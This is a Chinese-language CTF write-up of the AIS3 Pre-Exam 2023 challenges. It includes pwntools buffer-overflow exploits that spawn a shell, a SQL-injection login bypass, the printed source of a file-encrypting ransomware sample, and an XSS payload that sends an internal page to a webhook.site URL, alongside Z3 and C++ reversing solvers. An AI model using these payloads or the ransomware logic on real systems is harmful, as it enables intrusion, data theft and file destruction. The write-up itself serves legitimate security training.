---
title: AIS3 Pre-Exam 2023 writeup
date: 2024-01-21 23:09:32
tags: AIS3 CTF
---

## Simple Reverse
https://www.youtube.com/watch?v=Usn6FCXIhvk&t=150s
我有印象寫過類似題 看過上面的影片
想說複習一下 angr 跟 Z3 結果題目一模一樣
直接照抄 code 就解出來了
順利拿下首殺 XD

## Simple Pwn
在 ghidra 中會看到 
iStack_c = read(0,(long)&uStack_50 + 1,0x100);
可以 bof 並且也有一個 function 是執行 bin/sh 的
所以直接用 pwntools
```python=
from pwn import *
#r = process('./pwn')
r = remote("chals1.ais3.org", 11111)
r.recvuntil(b"Show me your name:")
targer_address = p64(0x4017ad)
r.sendline(b'A' * (0x50 - 1) + targer_address)
r.interactive()
```
## Fernet
把 code 丟給 ChatGPT 要他生成解答 code 就跑出來了
![](https://hackmd.io/_uploads/B1-tSxGB3.png)

## Login Panel
輸入 admin 跟 'or 1=1-- 之後進入
並且修改網址列 因為它登入以後 帳號就是 admin 了
之後就能拿到 Flag 了

## Robot
寫腳本去做字串拼接
```python=
from pwn import *

r = remote("chals1.ais3.org", 12348)

r.recvuntil("!")
q = r.recvline()
for j in range(90):
    q = r.recvline()
    print(q)
    a1 = ""
    a2 = ""
    chk = 0
    c = ""
    for i in q:
        if(chk == 0 and i >= ord("0") and i <= ord("9")):
            a1 += chr(i)
        elif(chk == 1 and i >= ord("0") and i <= ord("9")):
            a2 += chr(i)
        elif(i == 43 or i == 45 or i == 42 or i == 47):
            c = chr(i)
            chk = 1

    if c == '*':
        result = str(int(a1) * int(a2))
        print(result)
        r.sendline(result.encode())
            
    if c == '+':
        result = str(int(a1) + int(a2))
        print(result)
        r.sendline(result.encode())


r.interactive()
```
聽說有陷阱 但我沒碰到就是了
## Flag Sleeper
這題用 Ghidra 打開看起來特別亂
但用 IDA 就很直觀 不知道為啥 超怪
他的運算就是一個 v9[i] ^ v10[i]
然後有一個 v8 決定他的順序
```cpp=
#include <bits/stdc++.h>

using namespace std;

int v8[0x34];
int v9[0x34];
int v10[0x34];


int main() {
    v8[0] = 10;
    v8[1] = 12;
    v8[2] = 28;
    v8[3] = 7;
    v8[4] = 38;
    v8[5] = 31;
    v8[6] = 47;
    v8[7] = 44;
    v8[8] = 42;
    v8[9] = 35;
    v8[10] = 48;
    v8[11] = 30;
    v8[12] = 21;
    v8[13] = 11;
    v8[14] = 17;
    v8[15] = 16;
    v8[16] = 34;
    v8[17] = 40;
    v8[18] = 33;
    v8[19] = 39;
    v8[20] = 41;
    v8[21] = 9;
    v8[22] = 22;
    v8[23] = 4;
    v8[24] = 6;
    v8[25] = 20;
    v8[26] = 19;
    v8[27] = 46;
    v8[28] = 23;
    v8[29] = 45;
    v8[30] = 26;
    v8[31] = 0;
    v8[32] = 15;
    v8[33] = 3;
    v8[34] = 8;
    v8[35] = 43;
    v8[36] = 14;
    v8[37] = 5;
    v8[38] = 2;
    v8[39] = 27;
    v8[40] = 49;
    v8[41] = 1;
    v8[42] = 51;
    v8[43] = 36;
    v8[44] = 37;
    v8[45] = 24;
    v8[46] = 25;
    v8[47] = 50;
    v8[48] = 32;
    v8[49] = 13;
    v8[50] = 29;
    v8[51] = 18;
    v9[0] = 212;
    v9[1] = 232;
    v9[2] = 164;
    v9[3] = 28;
    v9[4] = 253;
    v9[5] = 132;
    v9[6] = 194;
    v9[7] = 47;
    v9[8] = 46;
    v9[9] = 150;
    v9[10] = 96;
    v9[11] = 216;
    v9[12] = 121;
    v9[13] = 216;
    v9[14] = 140;
    v9[15] = 164;
    v9[16] = 49;
    v9[17] = 219;
    v9[18] = 147;
    v9[19] = 252;
    v9[20] = 201;
    v9[21] = 28;
    v9[22] = 9;
    v9[23] = 188;
    v9[24] = 155;
    v9[25] = 79;
    v9[26] = 133;
    v9[27] = 255;
    v9[28] = 104;
    v9[29] = 20;
    v9[30] = 87;
    v9[31] = 64;
    v9[32] = 147;
    v9[33] = 143;
    v9[34] = 68;
    v9[35] = 147;
    v9[36] = 142;
    v9[37] = 96;
    v9[38] = 165;
    v9[39] = 244;
    v9[40] = 62;
    v9[41] = 58;
    v9[42] = 119;
    v9[43] = 25;
    v9[44] = 61;
    v9[45] = 56;
    v9[46] = 71;
    v9[47] = 182;
    v9[48] = 7;
    v9[49] = 37;
    v9[50] = 1;
    v9[51] = 154;
    v10[0] = 237;
    v10[1] = 217;
    v10[2] = 212;
    v10[3] = 40;
    v10[4] = 149;
    v10[5] = 219;
    v10[6] = 165;
    v10[7] = 112;
    v10[8] = 29;
    v10[9] = 241;
    v10[10] = 8;
    v10[11] = 189;
    v10[12] = 13;
    v10[13] = 224;
    v10[14] = 211;
    v10[15] = 149;
    v10[16] = 5;
    v10[17] = 184;
    v10[18] = 255;
    v10[19] = 207;
    v10[20] = 162;
    v10[21] = 122;
    v10[22] = 86;
    v10[23] = 199;
    v10[24] = 170;
    v10[25] = 122;
    v10[26] = 240;
    v10[27] = 206;
    v10[28] = 9;
    v10[29] = 102;
    v10[30] = 102;
    v10[31] = 1;
    v10[32] = 163;
    v10[33] = 188;
    v10[34] = 119;
    v10[35] = 225;
    v10[36] = 239;
    v10[37] = 3;
    v10[38] = 246;
    v10[39] = 153;
    v10[40] = 9;
    v10[41] = 115;
    v10[42] = 10;
    v10[43] = 70;
    v10[44] = 94;
    v10[45] = 103;
    v10[46] = 52;
    v10[47] = 137;
    v10[48] = 97;
    v10[49] = 29;
    v10[50] = 109;
    v10[51] = 208;
    string s = "";
    map<int, int> mp;
    for(int i = 0; i < 52; i++) {
        mp[v8[i]] = i;
    }
    for(int i = 0; i < 52; i++) {
        s += char(v10[i] ^ v9[i]);
    }
            cout << mp[0] << '\n';

    for(int i = 0; i < 52; i++) {
        cout << s[mp[i]];
    }
    cout << s[31];
}
```
我用 map 去跑啦 因為比較熟悉
## ManagementSystem
在刪除帳號那邊會有一個 gets 可以跳任意 Function 
不過我測試好像他一定要創建一個用戶才能啟用
中間我有踩一個坑
原本是用 ghidra 的地址複製貼上上去直接用
但是會跳到那個 Function 但是卻會 EOF 而不是 get shell 
後面改用 ELF 就解決了
```python=
rom pwn import *

r = remote('chals1.ais3.org', 10003)
elf = ELF("./ms")

r.recvuntil(b">")

r.sendline(b"1")
r.recvuntil(b":")
r.sendline(b"1")
r.recvuntil(b":")
r.sendline(b"1")
r.recvuntil(b":")
r.sendline(b"1")

r.recvuntil(b">")
r.sendline(b"3")
a = r.recvuntil(b": ")
print(a)
addr = elf.symbols['secret_function']

payload = b'a' * (0x67) + p64(addr)
r.send(payload)

r.interactive()
```

## Welcome
應該不用說吧
就直接看 owo

## AIS3 ransomware
打開發現他會生成一個 node.exe 跟一個 js 黨
後面利用 x32dbg 暫停後發現 node.exe 就單純是一個執行 node 的檔案而已
然後 js 看起來非常複雜
所以我又丟給 ChatGPT 分析
```js=
const fs = require('fs');
const path = require('path');

function encrypt(key, plaintext) {
  let s = [];
  let j = 0;
  let x;
  let result = '';
  
  for (let i = 0; i < 256; i++) {
    s[i] = i;
  }

  for (let i = 0; i < 256; i++) {
    j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
    x = s[i];
    s[i] = s[j];
    s[j] = x;
  }

  let i = 0;
  j = 0;

  for (let k = 0; k < plaintext.length; k++) {
    i = (i + 1) % 256;
    j = (j + s[i]) % 256;
    x = s[i];
    s[i] = s[j];
    s[j] = x;
    result += String.fromCharCode(plaintext.charCodeAt(k) ^ s[(s[i] + s[j]) % 256]);
  }

  return result;
}

const getFilePathsRecursive = function (folderPath, filePaths) {
  let files = fs.readdirSync(folderPath);
  filePaths = filePaths || [];

  files.forEach(function (filename) {
    let fullPath = path.join(folderPath, filename);

    if (fs.statSync(fullPath).isDirectory()) {
      filePaths = getFilePathsRecursive(fullPath, filePaths);
    } else {
      filePaths.push(path.join(__dirname, folderPath, filename));
    }
  });

  return filePaths;
};

let key = process.argv.slice(2)[0];
let filePaths = getFilePathsRecursive('./target_ais3', []);

filePaths.forEach(function (filePath) {
  if (filePath.includes('.ais3')) {
    return;
  }

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      return;
    }

    if (data.includes('AIS3')) {
      data += 'AIS3AIS3AIS3AIS3AIS3';
      let encryptedData = Buffer.from(encrypt(key, data)).toString('base64');
      fs.writeFile(filePath + '.ais3', encryptedData, (err) => {});
      fs.unlinkSync(filePath);
    }
  });
});

```
並讓他生成解密 Function 不過分析後發現他還需要一個 Key
```js=
function decrypt(key, cipherText) {
    var S = [], j = 0, temp, plaintext = '';
    for (var i = 0; i < 256; i++) {
        S[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key.charCodeAt(i % key.length)) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }
    i = 0;
    j = 0;
    for (var k = 0; k < cipherText.length; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        plaintext += String.fromCharCode(cipherText.charCodeAt(k) ^ S[(S[i] + S[j]) % 256]);
    }
    return plaintext;
}

```
他執行主要會是 `./node.exe a.js key` 
因此我就用 x32dbg 在 87% 的時候暫停
並且用 F8 來步進 當時我猜他的 Key 一定會出現在 register 裡面所以就慢慢跑過去
結果還真的被我找到了
把 key 複製下來 用來解密 這題就解出來了


## E-Portfolio baby
他會是一個頁面
然後 admin 會瀏覽該網頁
因此我就猜是否可以用 XSS 
之後我就用 webhook 來收資料
確實收到了 並且也標示說他主機是 http://web:8000
因此我讓他把本機 8000 port 的 portfolio 路徑的東西輸出出來
就拿到 Flag 了
然後我原本以為後面還有 結果拿到的密碼就是 Flag 很不明顯==
```
<img src=test onerror="fetch('http://web:8000/api/portfolio').then((response) => response.text()).then((text) => {fetch('https://webhook.site/af72bd92-e9b5-470b-bf39-749e3598c332?a='+text)})">
```
## Vivid Emotion
利用 ghidra 的 export 功能 讓他輸出 cpp code
並寫腳本把有包含 Return 的字串抽出來
後面手工排除其他的
並且使用 vscode 修改 return 讓他變成 s.add
; 變成 )

就能夠用 z3 快速解出答案了
```python=
from z3 import *

arr = [BitVec(f'arr{i}', 16) for i in range(333)]

s = Solver()

s.add(arr[194] + arr[39] == 400)
s.add(arr[129] + arr[70] == 0x11d)
s.add(arr[260] + arr[234] == 0x148)
s.add(arr[294] + arr[254] == 0x135)
s.add(arr[304] + arr[48] == 0x89)
s.add(arr[233] + arr[211] == 0x107)
s.add(arr[178] + arr[103] == 0x10b)
s.add(arr[314] + arr[303] == 0x166)
s.add(arr[141] + arr[37] == 0x125)
s.add(arr[23] + arr[0] == 0x1a4)
s.add(arr[275] + arr[186] == 200)
s.add(arr[55] + arr[27] == 0x1a4)
s.add(arr[203] + arr[97] == 0x109)
s.add(arr[240] + arr[58] == 0x38)
s.add(arr[225] + arr[72] == 0x52)
s.add(arr[255] + arr[71] == 0x5f)
s.add(arr[326] + arr[234] == 0xd4)
s.add(arr[62] + arr[60] == 0x119)
s.add(arr[207] + arr[159] == 0xeb)
s.add(arr[316] + arr[291] == 0x1a0)
s.add(arr[207] + arr[174] == 0x196)
s.add(arr[219] + arr[112] == 0xa0)
s.add(arr[288] + arr[20] == 0xed)
s.add(arr[331] + arr[63] == 0x136)
s.add(arr[227] + arr[70] == 0x185)
s.add(arr[321] + arr[1] == 0x4d)
s.add(arr[122] + arr[34] == 0x68)
s.add(arr[286] + arr[265] == 0xde)
s.add(arr[208] + arr[138] == 0x184)
s.add(arr[280] + arr[154] == 0x137)
s.add(arr[307] + arr[109] == 0x19a)
s.add(arr[100] + arr[56] == 0x15b)
s.add(arr[281] + arr[146] == 0x170)
s.add(arr[229] + arr[209] == 0x54)
s.add(arr[277] + arr[220] == 0x4b)
s.add(arr[61] + arr[51] == 0xef)
s.add(arr[261] + arr[195] == 0xdb)
s.add(arr[289] + arr[162] == 0x43)
s.add(arr[80] + arr[8] == 0x129)
s.add(arr[263] + arr[52] == 0x117)
s.add(arr[230] + arr[226] == 0x25)
s.add(arr[245] + arr[5] == 0x4a)
s.add(arr[297] + arr[52] == 0x11e)
s.add(arr[308] + arr[83] == 0xec)
s.add(arr[191] + arr[55] == 0x1ae)
s.add(arr[117] + arr[17] == 0x15a)
s.add(arr[228] + arr[38] == 0x154)
s.add(arr[245] + arr[30] == 0x5c)
s.add(arr[169] + arr[126] == 0x1aa)
s.add(arr[218] + arr[180] == 199)
s.add(arr[183] + arr[156] == 0x146)
s.add(arr[154] + arr[111] == 0x14b)
s.add(arr[158] + arr[59] == 0x162)
s.add(arr[307] + arr[15] == 0x157)
s.add(arr[179] + arr[114] == 0x122)
s.add(arr[241] + arr[145] == 299)
s.add(arr[135] + arr[86] == 0x14e)
s.add(arr[147] + arr[73] == 0xe5)
s.add(arr[298] + arr[166] == 0x108)
s.add(arr[269] + arr[115] == 0x3c)
s.add(arr[301] + arr[94] == 0x179)
s.add(arr[200] + arr[198] == 0x3b)
s.add(arr[264] + arr[97] == 0xf1)
s.add(arr[213] + arr[71] == 0xa9)
s.add(arr[252] + arr[142] == 0x22)
s.add(arr[161] + arr[62] == 0x10f)
s.add(arr[202] + arr[192] == 0x139)
s.add(arr[205] + arr[36] == 0x96)
s.add(arr[332] + arr[330] == 0x101)
s.add(arr[243] + arr[122] == 0x62)
s.add(arr[293] + arr[189] == 0x6e)
s.add(arr[315] + arr[86] == 0x12a)
s.add(arr[283] + arr[231] == 0xb0)
s.add(arr[286] + arr[134] == 0xa8)
s.add(arr[75] + arr[54] == 0x76)
s.add(arr[137] + arr[25] == 0xcf)
s.add(arr[235] + arr[16] == 0xd8)
s.add(arr[317] + arr[290] == 0x8d)
s.add(arr[130] + arr[124] == 0xb7)
s.add(arr[283] + arr[256] == 0x185)
s.add(arr[330] + arr[278] == 0x78)
s.add(arr[261] + arr[91] == 0x17e)
s.add(arr[260] + arr[174] == 0x199)
s.add(arr[309] + arr[131] == 0xf7)
s.add(arr[322] + arr[279] == 99)
s.add(arr[222] + arr[124] == 0xbf)
s.add(arr[263] + arr[156] == 0x146)
s.add(arr[236] + arr[232] == 0x43)
s.add(arr[321] + arr[31] == 0x51)
s.add(arr[210] + arr[89] == 0xce)
s.add(arr[185] + arr[10] == 0x13f)
s.add(arr[265] + arr[31] == 0x80)
s.add(arr[150] + arr[14] == 0xf6)
s.add(arr[219] + arr[13] == 0xa2)
s.add(arr[175] + arr[147] == 0xae)
s.add(arr[182] + arr[2] == 0x32)
s.add(arr[74] + arr[66] == 0x138)
s.add(arr[314] + arr[223] == 0x103)
s.add(arr[222] + arr[59] == 0x92)
s.add(arr[241] + arr[13] == 0x12a)
s.add(arr[324] + arr[299] == 0xe5)
s.add(arr[221] + arr[82] == 0x6b)
s.add(arr[320] + arr[75] == 0xad)
s.add(arr[257] + arr[9] == 0x128)
s.add(arr[238] + arr[201] == 0x13a)
s.add(arr[183] + arr[67] == 0x1d8)
s.add(arr[138] + arr[80] == 0x150)
s.add(arr[331] + arr[110] == 0x106)
s.add(arr[233] + arr[93] == 0xd8)
s.add(arr[88] + arr[82] == 0x9d)
s.add(arr[285] + arr[29] == 0x1bc)
s.add(arr[152] + arr[96] == 0x137)
s.add(arr[99] + arr[81] == 0xb8)
s.add(arr[202] + arr[108] == 0x13f)
s.add(arr[189] + arr[22] == 0xf8)
s.add(arr[215] + arr[85] == 0xe4)
s.add(arr[128] + arr[117] == 0x10c)
s.add(arr[196] + arr[193] == 0x175)
s.add(arr[106] + arr[41] == 0xf1)
s.add(arr[258] + arr[194] == 0xc1)
s.add(arr[327] + arr[254] == 0x147)
s.add(arr[87] + arr[73] == 0x172)
s.add(arr[290] + arr[78] == 0x14a)
s.add(arr[85] + arr[12] == 0x129)
s.add(arr[284] + arr[120] == 0x59)
s.add(arr[218] + arr[177] == 0xe1)
s.add(arr[116] + arr[53] == 0xfb)
s.add(arr[164] + arr[153] == 0x9d)
s.add(arr[197] + arr[79] == 0x12a)
s.add(arr[162] + arr[145] == 0x65)
s.add(arr[250] + arr[203] == 0xe5)
s.add(arr[167] + arr[78] == 0x1e4)
s.add(arr[280] + arr[114] == 0x148)
s.add(arr[323] + arr[35] == 0xe9)
s.add(arr[301] + arr[19] == 0xed)
s.add(arr[239] + arr[87] == 0x119)
s.add(arr[299] + arr[7] == 0xb1)
s.add(arr[252] + arr[72] == 0x37)
s.add(arr[318] + arr[302] == 0x158)
s.add(arr[310] + arr[249] == 0xe8)
s.add(arr[171] + arr[38] == 0x12a)
s.add(arr[91] + arr[45] == 0x155)
s.add(arr[242] + arr[33] == 0x1a3)
s.add(arr[268] + arr[181] == 0xc2)
s.add(arr[25] + arr[12] == 0x19c)
s.add(arr[247] + arr[205] == 0x134)
s.add(arr[186] + arr[180] == 0xdf)
s.add(arr[296] + arr[190] == 0x1ec)
s.add(arr[168] + arr[22] == 0x139)
s.add(arr[262] + arr[102] == 0x160)
s.add(arr[294] + arr[173] == 0x9c)
s.add(arr[251] + arr[200] == 0x7a)
s.add(arr[206] + arr[105] == 0x15d)
s.add(arr[253] + arr[227] == 0xf0)
s.add(arr[100] + arr[61] == 0x171)
s.add(arr[167] + arr[6] == 0x1a4)
s.add(arr[269] + arr[248] == 0xba)
s.add(arr[65] + arr[3] == 0x10a)
s.add(arr[208] + arr[35] == 0x181)
s.add(arr[315] + arr[176] == 0xa8)
s.add(arr[267] + arr[90] == 0x1de)
s.add(arr[285] + arr[240] == 0x116)
s.add(arr[319] + arr[313] == 0x157)
s.add(arr[264] + arr[148] == 0x39)
s.add(arr[328] + arr[132] == 0xcd)
s.add(arr[258] + arr[41] == 0x5a)
s.add(arr[221] + arr[195] == 0x6f)
s.add(arr[246] + arr[155] == 0xe9)
s.add(arr[295] + arr[95] == 0xd7)
s.add(arr[98] + arr[74] == 0xf8)
s.add(arr[226] + arr[5] == 0x37)
s.add(arr[102] + arr[92] == 0x121)
s.add(arr[248] + arr[214] == 0xac)
s.add(arr[256] + arr[120] == 0x10c)
s.add(arr[173] + arr[109] == 0x111)
s.add(arr[238] + arr[47] == 0x7d)
s.add(arr[212] + arr[170] == 0x15a)
s.add(arr[273] + arr[29] == 0x137)
s.add(arr[305] + arr[224] == 0x115)
s.add(arr[306] + arr[66] == 0x107)
s.add(arr[149] + arr[141] == 0x187)
s.add(arr[239] + arr[50] == 0xda)
s.add(arr[142] + arr[32] == 0xc4)
s.add(arr[328] + arr[103] == 0x46)
s.add(arr[199] + arr[175] == 0xb7)
s.add(arr[300] + arr[270] == 0xe7)
s.add(arr[225] + arr[104] == 0x10d)
s.add(arr[306] + arr[199] == 0xe8)
s.add(arr[236] + arr[159] == 0x2b)
s.add(arr[143] + arr[24] == 0x1d3)
s.add(arr[272] + arr[270] == 0xdf)
s.add(arr[302] + arr[281] == 0x1a6)
s.add(arr[292] + arr[198] == 0xf6)
s.add(arr[132] + arr[51] == 0x103)
s.add(arr[197] + arr[115] == 0xb5)
s.add(arr[309] + arr[153] == 0xcb)
s.add(arr[332] + arr[125] == 0x17d)
s.add(arr[244] + arr[63] == 0x165)
s.add(arr[217] + arr[188] == 0xfb)
s.add(arr[274] + arr[211] == 0x109)
s.add(arr[237] + arr[57] == 0x12f)
s.add(arr[291] + arr[28] == 0x1a1)
s.add(arr[244] + arr[33] == 0x1a2)
s.add(arr[144] + arr[127] == 0xab)
s.add(arr[101] + arr[77] == 0x17a)
s.add(arr[289] + arr[149] == 0xbe)
s.add(arr[324] + arr[11] == 0xf9)
s.add(arr[50] + arr[23] == 0x121)
s.add(arr[131] + arr[128] == 0x12d)
s.add(arr[179] + arr[119] == 0x136)
s.add(arr[54] + arr[4] == 0x7d)
s.add(arr[322] + arr[196] == 0x10d)
s.add(arr[230] + arr[4] == 0x23)
s.add(arr[139] + arr[40] == 0x78)
s.add(arr[318] + arr[99] == 0x11f)
s.add(arr[237] + arr[1] == 0x73)
s.add(arr[18] + arr[10] == 0x88)
s.add(arr[229] + arr[43] == 0xe8)
s.add(arr[166] + arr[26] == 0x162)
s.add(arr[215] + arr[127] == 0xe4)
s.add(arr[105] + arr[15] == 0x177)
s.add(arr[293] + arr[46] == 0xcc)
s.add(arr[228] + arr[89] == 0x1c7)
s.add(arr[317] + arr[267] == 0x11a)
s.add(arr[295] + arr[150] == 99)
s.add(arr[300] + arr[146] == 0x116)
s.add(arr[271] + arr[81] == 0x7a)
s.add(arr[220] + arr[165] == 0xf6)
s.add(arr[257] + arr[64] == 0xd4)
s.add(arr[133] + arr[93] == 0x99)
s.add(arr[181] + arr[129] == 0x6f)
s.add(arr[266] + arr[184] == 0xb0)
s.add(arr[329] + arr[311] == 0x83)
s.add(arr[123] + arr[39] == 0x139)
s.add(arr[325] + arr[242] == 0xf8)
s.add(arr[191] + arr[126] == 0x199)
s.add(arr[176] + arr[160] == 0x101)
s.add(arr[214] + arr[190] == 0xfb)
s.add(arr[246] + arr[185] == 0xc6)
s.add(arr[26] + arr[18] == 0x6d)
s.add(arr[143] + arr[104] == 0x1ce)
s.add(arr[64] + arr[56] == 0x111)
s.add(arr[118] + arr[30] == 0x102)
s.add(arr[313] + arr[76] == 0x9d)
s.add(arr[266] + arr[139] == 0xad)
s.add(arr[118] + arr[111] == 0x1a8)
s.add(arr[44] + arr[6] == 0x19c)
s.add(arr[65] + arr[7] == 0x149)
s.add(arr[48] + arr[43] == 0x146)
s.add(arr[76] + arr[32] == 0xb0)
s.add(arr[152] + arr[112] == 300)
s.add(arr[177] + arr[42] == 0x121)
s.add(arr[151] + arr[116] == 0xb7)
s.add(arr[305] + arr[209] == 0x10b)
s.add(arr[308] + arr[57] == 0x131)
s.add(arr[136] + arr[119] == 0x166)
s.add(arr[251] + arr[14] == 0x13f)
s.add(arr[297] + arr[47] == 0x11d)
s.add(arr[243] + arr[216] == 0x76)
s.add(arr[165] + arr[130] == 0xc2)
s.add(arr[296] + arr[168] == 0x18b)
s.add(arr[303] + arr[92] == 0x138)
s.add(arr[204] + arr[158] == 0x107)
s.add(arr[135] + arr[46] == 0x125)
s.add(arr[276] + arr[45] == 0x169)
s.add(arr[235] + arr[101] == 0x188)
s.add(arr[187] + arr[16] == 0x4d)
s.add(arr[316] + arr[201] == 0x1b8)
s.add(arr[292] + arr[90] == 0x1bd)
s.add(arr[42] + arr[36] == 0xcc)
s.add(arr[123] + arr[21] == 0xb7)
s.add(arr[319] + arr[134] == 0xf7)
s.add(arr[232] + arr[216] == 0x7d)
s.add(arr[224] + arr[77] == 0x10c)
s.add(arr[287] + arr[84] == 0x1e1)
s.add(arr[178] + arr[53] == 0x1a7)
s.add(arr[250] + arr[60] == 0x11b)
s.add(arr[247] + arr[106] == 0x188)
s.add(arr[277] + arr[163] == 0xfd)
s.add(arr[213] + arr[155] == 0x173)
s.add(arr[44] + arr[37] == 0x127)
s.add(arr[231] + arr[192] == 0x9b)
s.add(arr[171] + arr[110] == 0x10e)
s.add(arr[204] + arr[17] == 0x106)
s.add(arr[212] + arr[20] == 0x174)
s.add(arr[325] + arr[271] == 0x71)
s.add(arr[188] + arr[40] == 0x9d)
s.add(arr[275] + arr[262] == 0x118)
s.add(arr[312] + arr[136] == 0x152)
s.add(arr[311] + arr[68] == 0xb1)
s.add(arr[279] + arr[137] == 0x26)
s.add(arr[304] + arr[24] == 0x109)
s.add(arr[125] + arr[9] == 0x177)
s.add(arr[172] + arr[113] == 0x3e)
s.add(arr[217] + arr[28] == 0x19e)
s.add(arr[288] + arr[268] == 0xf1)
s.add(arr[19] + arr[8] == 0xec)
s.add(arr[157] + arr[94] == 0xfc)
s.add(arr[133] + arr[58] == 0x8c)
s.add(arr[223] + arr[49] == 0xe2)
s.add(arr[253] + arr[84] == 0x150)
s.add(arr[98] + arr[3] == 0x1a)
s.add(arr[187] + arr[160] == 0xe0)
s.add(arr[206] + arr[96] == 0xec)
s.add(arr[327] + arr[249] == 0x103)
s.add(arr[95] + arr[88] == 0xff)
s.add(arr[161] + arr[67] == 0x162)
s.add(arr[326] + arr[278] == 0xb9)
s.add(arr[163] + arr[157] == 0x121)
s.add(arr[329] + arr[287] == 0x169)
s.add(arr[276] + arr[140] == 0x1c9)
s.add(arr[184] + arr[121] == 0x1f)
s.add(arr[182] + arr[11] == 0x99)
s.add(arr[121] + arr[69] == 0x3d)
s.add(arr[284] + arr[148] == 0x42)
s.add(arr[310] + arr[2] == 0x8d)
s.add(arr[210] + arr[49] == 0x93)
s.add(arr[320] + arr[272] == 0xfa)
s.add(arr[193] + arr[107] == 0x191)
s.add(arr[172] + arr[107] == 0xce)
s.add(arr[282] + arr[164] == 0xc0)
s.add(arr[140] + arr[113] == 0x114)
s.add(arr[27] + arr[21] == 0x144)
s.add(arr[274] + arr[108] == 0x146)
s.add(arr[255] + arr[151] == 0xd6)
s.add(arr[273] + arr[68] == 0x112)
s.add(arr[259] + arr[83] == 0x8d)
s.add(arr[312] + arr[259] == 0x92)
s.add(arr[79] + arr[0] == 0x195)
s.add(arr[170] + arr[144] == 0xce)
s.add(arr[169] + arr[34] == 0x11a)
s.add(arr[282] + arr[69] == 0xb2)
s.add(arr[323] + arr[298] == 0x32)



print(s.check())
m = s.model()

for i in range(333):
    print(m[arr[i]].as_long())

```
然後我原本 bitvec 開 8 會錯
後面開 16 才解出答案

## 後面是一些有想法但腦霧的
eert 我有看到他要等於 0x27e3
然後先輸入 170 之後可以輸入 100 次
然後應該會把他加總起來
但是看到這邊我沒有繼續靜態分析==
直接用 gdb 看 register 但是他跑到 cmp 的時候卻都顯示出一樣的值
害我整個不知道該怎麼解==

還有 Pacman 
原本打開發現他很快 以為用 Cheat Engine 的 SpeedHack 解開第一關就有 Flag 了
但是並沒有 CE 的 SpeedHack 一點用也沒有 我用 x64dbg 弄上去突然又正常了
打完第一關沒 Flag 後就沒有繼續解了
不過我用 CE 想要拿分數卻拿不到 好像是因為它分數是 /10 以後存的 
當初腦霧沒有想要繼續嘗試QQ
而且連靜態分析都沒弄 解一個早上跟下午的題後腦袋真的會運轉不過來QQ 希望以後能夠避免這個問題==